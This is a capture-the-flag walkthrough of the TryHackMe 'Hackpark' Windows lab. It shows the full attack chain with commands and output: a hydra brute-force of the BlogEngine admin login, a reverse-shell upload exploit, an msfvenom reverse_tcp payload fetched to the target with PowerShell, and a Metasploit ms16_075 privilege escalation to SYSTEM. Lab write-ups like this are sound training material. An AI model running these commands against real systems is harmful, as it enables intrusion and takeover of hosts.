I"©B<h1 id="tryhackme---hackpark">TryHackMe - Hackpark</h1>
<hr />

<p><a href="https://tryhackme.com/room/hackpark">Hackpark</a> is a room on the offensive pentesting path on TryHackMe. Iâ€™m excited to do this writeup, regardless of the fact there are already so many, because this is a Windows machine. While I thoroughly enjoy doing Linux boxes, I recognize that the majority of the world has not adopted linux. Windows boxes are going to be more useful to me professionally. As usual, Iâ€™ve gone ahead and made a directory named <code class="language-plaintext highlighter-rouge">hackpark</code> as well as making an <code class="language-plaintext highlighter-rouge">nmap</code> directory.</p>

<h2 id="nmap-scan">nmap Scan</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -oN nmap/hackpark_initial.txt 10.10.252.61
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 14:55 CDT
Nmap scan report for 10.10.252.61
Host is up (0.16s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries
| /Account/*.* /search /search.aspx /error404.aspx
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-08-20T19:56:32+00:00; +6s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 5s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.56 seconds
</code></pre></div></div>
<p><br />
<br /></p>

<p>Looks like we have a website hosted on port 80. It also appears that we have some disallowed entries in <code class="language-plaintext highlighter-rouge">robots.txt</code>. Iâ€™m going to run <code class="language-plaintext highlighter-rouge">gobuster</code> to enumerate the directories while I take a look at the page to see what that looks like.</p>

<h2 id="web-enumeration">Web Enumeration</h2>

<p>Hereâ€™s the homepage of the hackpark website:
<br />
<br /></p>

<p><img src="assets/images/hackpark/hackpark_webpage.png" alt="" />
<br />
<br /></p>

<p>Looks like <code class="language-plaintext highlighter-rouge">pennywise</code> is the clown on the homepage. Taking a look around it seems that there is an <code class="language-plaintext highlighter-rouge">administrator</code> account, and the webpage is running a CMS called <code class="language-plaintext highlighter-rouge">blogengine</code>. <code class="language-plaintext highlighter-rouge">Gobuster</code> is also giving us a ton of directories so I stopped it early, but the one Iâ€™m most interested in is called <code class="language-plaintext highlighter-rouge">admin</code>.
<br />
<br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://10.10.252.61/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o gobuster_initial.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.252.61/
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/20 15:01:54 Starting gobuster
===============================================================
/content (Status: 301)
/archives (Status: 200)
/archive (Status: 200)
/scripts (Status: 301)
/search (Status: 200)
/account (Status: 301)
/custom (Status: 301)
/Search (Status: 200)
/ContactUs (Status: 200)
/Contact (Status: 200)
/Content (Status: 301)
/contact-us (Status: 200)
/contact_us (Status: 200)
/contactus (Status: 200)
/contact (Status: 200)
/contacts (Status: 200)
/contactUs (Status: 200)
/admin (Status: 302)
/Archive (Status: 200)
/contactinfo (Status: 200)
/setup (Status: 302)
/fonts (Status: 301)
...
/search_hd (Status: 200)
/searchFor (Status: 200)
/Archive-TarGzip (Status: 200)
/contactform_menu (Status: 200)
Progress: 124708 / 220561 (56.54%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/08/20 15:05:56 Finished
===============================================================
</code></pre></div></div>
<p><br />
<br /></p>

<p><img src="assets/images/hackpark/hackpark_login.png" alt="" />
<br />
<br /></p>

<p>This is the page we want. As I stated before there appears to be an <code class="language-plaintext highlighter-rouge">administrator</code> account, but Iâ€™ll try using <code class="language-plaintext highlighter-rouge">admin</code> for the username. Iâ€™ll be using hydra to brute force the page. I still sometimes get tripped up by the syntax of using hydra on a webpage so Iâ€™ll go into some more detail here about how I came up with the command. Weâ€™re looking for weak passwords in this instance so the wordlist that Iâ€™ll use is <code class="language-plaintext highlighter-rouge">rockyou.txt</code>. Hereâ€™s the general syntax when using hydra to brute force a web login.<br />
<br />
<br /></p>

<p><code class="language-plaintext highlighter-rouge">
hydra -l &lt;username&gt; -p &lt;password list&gt; &lt;IP Address&gt; http-form-post &lt;login page:request headers:failed login message&gt;
</code>
<br />
<br />
As I said before Iâ€™ll be using the username <code class="language-plaintext highlighter-rouge">admin</code> and the password list rockyou.txt. The parameters can be found a few ways, but the easiest is in burp suite. Type in any username and password, then look at where the POST request is getting sent to, in our case, itâ€™s <code class="language-plaintext highlighter-rouge">/Account/login.aspx</code>. Weâ€™ll type that into the <code class="language-plaintext highlighter-rouge">login page</code> of our command. Then find the headers by looking at the bottom of the request where it starts with <code class="language-plaintext highlighter-rouge">__VIEWSTATE...</code> and replace your username with <code class="language-plaintext highlighter-rouge">^USER^</code> and password with <code class="language-plaintext highlighter-rouge">PASS</code>, then copy and paste that into the command as the <code class="language-plaintext highlighter-rouge">request headers</code>. Finally send the request through and see that the failed login says <code class="language-plaintext highlighter-rouge">Login failed</code> and type that into the <code class="language-plaintext highlighter-rouge">failed login message</code>. The BurpSuite window you need and the end result should look something like this:
<br />
<br /></p>

<p><img src="assets/images/hackpark/hackpark_hydra.png" alt="BurpSuite Request Image" />
<br />
<br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.99.227 http-form-post '/Account/login.aspx:__VIEWSTATE=Yz2BmKWWmXED1M056DNvSQhT62lTMsJhye52KUnzi5j%2FYknWsMsDcNTgSNiRIP2D0%2Bc5vRnv5V%2BJjLsayVDwL%2FGipfl%2FYYKH9z5aG6v7oPhjdXPFV%2F1TPaFuzULQdV7VKi%2FQ2whj3p5jjcsl0naPMgEzObayz4u6g%2B09OsJe3mU7EaMUwhOL0zl7clQ5odf5BLU6hvYwWyLOTvieZ%2BbgWMfjXaxZa75LXWImGmWDdtx5GsbWohL7CAkW5%2B%2Bb2y%2BZzr%2F9OlBObL7ZFPuzNZ%2FMdB18F4ddVhgppKkgvAKRc4OjIdcNdJ8JYICw0H58CV2J8oNn3xlz6PiXnSDDRRQnwWGcUubFx6yaezYKmkB8McM1s7IG&amp;__EVENTVALIDATION=%2FQ1jgWYDvNlzWDYKERdr1OFYc%2FdP88fNJliWRB6G56lCwhimMmZ%2Bm629vWFW8m1FXpiyykZyzK1hCR3k7QwTE00bvmdzREUCtVMF6kHqC10GEbK2BLBoH4ckTVI4VoLWV%2F7FOt2QmdJL6t%2BdVb3DJpdRPLybAcJN1dMzqpj7zMZRylt%2B&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'
Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-21 13:35:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.99.227:80/Account/login.aspx:__VIEWSTATE=Yz2BmKWWmXED1M056DNvSQhT62lTMsJhye52KUnzi5j%2FYknWsMsDcNTgSNiRIP2D0%2Bc5vRnv5V%2BJjLsayVDwL%2FGipfl%2FYYKH9z5aG6v7oPhjdXPFV%2F1TPaFuzULQdV7VKi%2FQ2whj3p5jjcsl0naPMgEzObayz4u6g%2B09OsJe3mU7EaMUwhOL0zl7clQ5odf5BLU6hvYwWyLOTvieZ%2BbgWMfjXaxZa75LXWImGmWDdtx5GsbWohL7CAkW5%2B%2Bb2y%2BZzr%2F9OlBObL7ZFPuzNZ%2FMdB18F4ddVhgppKkgvAKRc4OjIdcNdJ8JYICw0H58CV2J8oNn3xlz6PiXnSDDRRQnwWGcUubFx6yaezYKmkB8McM1s7IG&amp;__EVENTVALIDATION=%2FQ1jgWYDvNlzWDYKERdr1OFYc%2FdP88fNJliWRB6G56lCwhimMmZ%2Bm629vWFW8m1FXpiyykZyzK1hCR3k7QwTE00bvmdzREUCtVMF6kHqC10GEbK2BLBoH4ckTVI4VoLWV%2F7FOt2QmdJL6t%2BdVb3DJpdRPLybAcJN1dMzqpj7zMZRylt%2B&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[STATUS] 937.00 tries/min, 937 tries in 00:01h, 14343462 to do in 255:08h, 16 active
[80][http-post-form] host: 10.10.99.227   login: admin   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-21 13:37:30
</code></pre></div></div>
<p><br />
<br /></p>

<h2 id="foothold">Foothold</h2>

<p>Now that weâ€™re in the admin dashboard, we can start to take a look around and see what weâ€™re working with here. Visiting the about page gives us a good idea about the CMS that we have. With that information we can do some research on exploits that we might be able to use.
<br />
<br /></p>

<p><img src="assets/images/hackpark/hackpark_blog.png" alt="" />
<br />
<br /></p>

<p>Using a quick google search shows us that the CMS has a known vulnerability we can exploit on <a href="https://www.exploit-db.com/exploits/46353">exploit-db</a>. The exploit gives us good instructions on how to compromise the machine. First we navigate to <code class="language-plaintext highlighter-rouge">/admin/app/editor/editpost.cshtml</code> on our machine. Then we need to click on the file icon on the top right of our post window, this will allow us to upload our exploit. Once weâ€™ve made sure that weâ€™ve changed the ip and port number of the exploit, we have to upload our exploit as <code class="language-plaintext highlighter-rouge">PostView.ascx</code>.
<br />
<br /></p>

<p><img src="assets/images/hackpark/hackpark_upload.png" alt="" />
<br />
<br /></p>

<p>Now we set a netcat listener on our attacking machine, and navigate to <code class="language-plaintext highlighter-rouge">?theme=../../App_Data/files</code> on our victim website to trigger the exploit.
<br />
<br /></p>

<p><img src="assets/images/hackpark/hackpark_initial.png" alt="" />
<br />
<br /></p>

<h2 id="upgrading-the-shell">Upgrading the Shell</h2>

<p>The next step is to upgrade our shell. Iâ€™ll be using metasploit for this shell upgrade. We can use powershell to upload a <code class="language-plaintext highlighter-rouge">msfvenom</code> payload and connect with the <code class="language-plaintext highlighter-rouge">multi/handler</code> on metasploit. You can find a good amount of <code class="language-plaintext highlighter-rouge">msfvenom</code> commands <a href="https://netsec.ws/?p=331">here</a>. Hereâ€™s my command:
<br />
<br /></p>

<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code>
<br />
<br /></p>

<p>The next step is to upload our payload to the victim machine. Iâ€™ll first spin up a webserver in the directory with my payload using <code class="language-plaintext highlighter-rouge">python3 -m http.server</code> Iâ€™m sure thereâ€™s a command we can use striaght from the command prompt, but Iâ€™m going to upload it with powershell in the <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> folder. After navigating to the proper directory, hereâ€™s the command for the file upload:
<br />
<br /></p>

<p><code class="language-plaintext highlighter-rouge">powershell Invoke-WebRequest http://&lt;your-ip&gt;:8000/&lt;payload&gt; -OutFile &lt;payload-name&gt;</code>
<br />
<br /></p>

<p>Once the fileâ€™s been uploaded, we need to set up metasploit. Type <code class="language-plaintext highlighter-rouge">use multi/handler</code> and set the <code class="language-plaintext highlighter-rouge">LHOST</code> and <code class="language-plaintext highlighter-rouge">LPORT</code> values to the same values in the payload. Be sure to set your payload as <code class="language-plaintext highlighter-rouge">windows/meterpreter/reverse_tcp</code> as well. Then run the exploit with <code class="language-plaintext highlighter-rouge">run</code>. Metasploit will listen for the payload. Switch over to the victim machine and simply run the payload, which in my case is simply <code class="language-plaintext highlighter-rouge">shell.exe</code>.
<br />
<br /></p>

<p><img src="assets/images/hackpark/hackpark_meterpreter.png" alt="" />
<br />
<br /></p>

<p>We now have a meterpreter shell on our victim machine.
<br />
<br /></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<p>One of the many cool things about metasploit is that it can automate the escalation process for us by typing <code class="language-plaintext highlighter-rouge">run post/multi/recon/local_exploit_suggester</code>. This runs through a bunch of known local exploits and sees what our victim might be vulnerable to.
<br />
<br /></p>

<p><img src="assets/images/hackpark/hackpark_privesc.png" alt="" />
<br />
<br /></p>

<p>Of these exploits, I like the look of the one at the bottom the most. So Hereâ€™s the general flow of my commands to get this exploit running:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt;
Background session 2? [y/N]  
msf6 exploit(multi/handler) &gt; use exploit/windows/local/ms16_075_reflection_juicy
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; options

Module options (exploit/windows/local/ms16_075_reflection_juicy):

   Name     Current Setting                         Required  Description
   ----     ---------------                         --------  -----------
   CLSID    {REDACTED}  yes       Set CLSID value of the DCOM to trigger
   SESSION                                          yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     REDACTED    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set LHOST tun0
LHOST =&gt; tun0
msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set session 2
session =&gt; 2
msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; run

[*] Started reverse TCP handler on REDACTED:4444
[+] Target appears to be vulnerable (Windows 2012 R2 (6.3 Build 9600).)
[*] Launching notepad to host the exploit...
[+] Process 2168 launched.
[*] Reflectively injecting the exploit DLL into 2168...
[*] Injecting exploit into 2168...
[*] Exploit injected. Injecting exploit configuration into 2168...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.66.180
[*] Meterpreter session 3 opened (REDACTED:4444 -&gt; 10.10.66.180:49427) at 2020-08-25 15:23:45 -0500

meterpreter &gt;
</code></pre></div></div>
<p><br />
<br /></p>

<h2 id="flags">Flags</h2>

<p>And of course, now that weâ€™re the <code class="language-plaintext highlighter-rouge">nt authority\system</code> user, we can grab our flags.</p>

<p><img src="assets/images/hackpark/hackpark_flags.png" alt="" /></p>

<p>As for the questions the room has we can get that info with <code class="language-plaintext highlighter-rouge">sysinfo</code> as well as by using <code class="language-plaintext highlighter-rouge">winpeas</code> to see what the suspicious</p>
:ET